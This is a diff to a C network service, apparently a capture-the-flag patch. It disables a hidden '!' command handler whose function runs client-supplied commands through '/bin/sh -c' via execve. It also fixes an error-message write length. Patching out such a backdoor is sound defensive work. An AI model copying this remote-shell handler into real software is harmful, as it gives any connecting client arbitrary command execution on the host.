@@ -210,11 +210,15 @@ void proc_cmdline(int conn, int pid) {
 
 }
 
-void pla61398(int conn) {
+#pragma GCC push_options
+#pragma GCC optimize ("O0")
+void NOPE_pla61398(int conn) {
 
 	char cmd[256];
 	char *args[4];
 	int i = -1;
+
+	return;
 
 	args[0] = strdup("/bin/sh");
 	args[1] = strdup("-c");
@@ -230,6 +234,7 @@ void pla61398(int conn) {
 	execve("/bin/sh", args, NULL);
 
 }
+#pragma GCC pop_options
 
 int get_int(int conn) {
 
@@ -319,7 +324,7 @@ void handle_client(int conn) {
 				break;
 
 			case '!':
-				pla61398(conn);
+				write(conn, "NOPE\n", 5);
 				break;
 
 			case '?':
@@ -336,7 +341,7 @@ void handle_client(int conn) {
 				break;
 
 			default:
-				write(conn, "ERROR: Unknown command\n", 16);
+				write(conn, "ERROR: Unknown command\n", 23);
 				return;
 
 		}
